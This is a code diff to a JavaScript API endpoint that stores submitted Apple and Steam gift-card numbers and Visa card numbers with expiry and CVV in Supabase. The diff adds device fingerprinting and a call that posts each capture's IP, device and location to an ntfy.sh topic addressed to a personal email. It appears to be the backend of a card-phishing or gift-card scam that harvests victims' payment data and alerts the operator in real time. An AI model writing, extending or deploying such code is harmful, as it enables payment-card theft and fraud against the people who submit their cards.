@@ -1,5 +1,77 @@
 import { supabase } from '../../lib/supabase'
 
+// Helper function to parse device from user agent (matches qazmlp.js logic)
+function parseDevice(userAgent, browserInfo) {
+  const ua = userAgent || ''
+  const browser = browserInfo ? JSON.parse(browserInfo) : null
+
+  let device = 'Unknown Device'
+  if (ua.includes('iPhone')) device = 'iPhone'
+  else if (ua.includes('iPad')) device = 'iPad'
+  else if (ua.includes('Android')) device = 'Android Device'
+  else if (ua.includes('Windows')) device = 'Windows PC'
+  else if (ua.includes('Macintosh')) device = 'MacBook/Mac'
+
+  if (browser && browser.platform === 'iPhone') device = 'iPhone'
+
+  const platform = browser?.platform || 'Unknown'
+  return `${device} (${platform})`
+}
+
+// Helper function to send notification via ntfy.sh
+async function sendNotification(cardData) {
+  const { type, ip_address, location, user_agent, browser_info } = cardData
+
+  // Format title based on card type
+  const titleMap = {
+    'apple': 'apple crd',
+    'steam': 'steam crd',
+    'visa': 'visa crd'
+  }
+  const title = titleMap[type] || `${type} crd`
+
+  // Parse device info
+  const device = parseDevice(user_agent, browser_info)
+
+  // Format time
+  const time = new Date().toLocaleString('en-US', {
+    timeZone: 'Africa/Lagos', // Adjust timezone as needed
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit',
+    hour12: true,
+    month: 'short',
+    day: 'numeric',
+    year: 'numeric'
+  })
+
+  // Build notification body
+  const body = `Type: ${type.charAt(0).toUpperCase() + type.slice(1)} Card
+IP Address: ${ip_address || 'N/A'}
+Device: ${device}
+Location: ${location || 'Unknown'}
+Time: ${time}`
+
+  console.log('[NTFY] Sending notification for', type, 'card...')
+
+  try {
+    const response = await fetch('https://ntfy.sh/my_secret_topic_name', {
+      method: 'POST',
+      headers: {
+        'Email': 'linda4uxo@gmail.com',
+        'Title': title
+      },
+      body: body
+    })
+    const responseText = await response.text()
+    console.log('[NTFY] Response status:', response.status)
+    console.log('[NTFY] Response body:', responseText)
+  } catch (err) {
+    console.error('[NTFY] Failed to send notification:', err)
+    // Don't throw - notification failure shouldn't break the card submission
+  }
+}
+
 export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' })
   const { cardNumber, type = 'apple', deviceId, browserInfo, location, expiry, cvv } = req.body || {}
@@ -32,6 +104,8 @@ export default async function handler(req, res) {
     cvv: type === 'visa' ? (cvv || null) : null
   }
 
+  let cardInserted = false
+
   try {
     // Check for duplicates from the same device
     if (deviceId) {
@@ -57,10 +131,20 @@ export default async function handler(req, res) {
       .insert([result])
 
     if (error) throw error
+
+    cardInserted = true
   } catch (err) {
     console.error(`Failed to save ${type} card to Supabase:`, err)
     return res.status(500).json({
       error: `Database save failed: ${err.message || 'Unknown error'}`
+    })
+  }
+
+  // Send notification AFTER successful card insertion (outside main try-catch)
+  if (cardInserted) {
+    // Fire and forget - don't await, just let it run in background
+    sendNotification(result).catch(err => {
+      console.error('[NTFY] Notification error (non-blocking):', err)
     })
   }
 
